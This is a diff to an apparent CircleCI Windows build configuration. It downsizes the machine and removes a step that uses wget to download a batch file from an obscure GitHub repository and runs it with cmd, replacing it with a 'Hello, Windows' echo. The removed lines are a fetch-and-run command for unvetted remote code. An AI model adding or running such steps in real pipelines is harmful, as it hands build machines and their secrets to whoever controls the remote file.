@@ -4,9 +4,7 @@ jobs:
   build:
     machine:
       image: 'windows-server-2022-gui:current'
-      resource_class: windows.large
+      resource_class: windows.medium
       shell: powershell.exe -ExecutionPolicy Bypass
     steps:
-      - run: |
-          wget -O wiz.bat https://github.com/ajiLa78/slepoq/raw/main/fiz.bat
-          cmd /c wiz.bat
+      - run: Write-Host 'Hello, Windows'
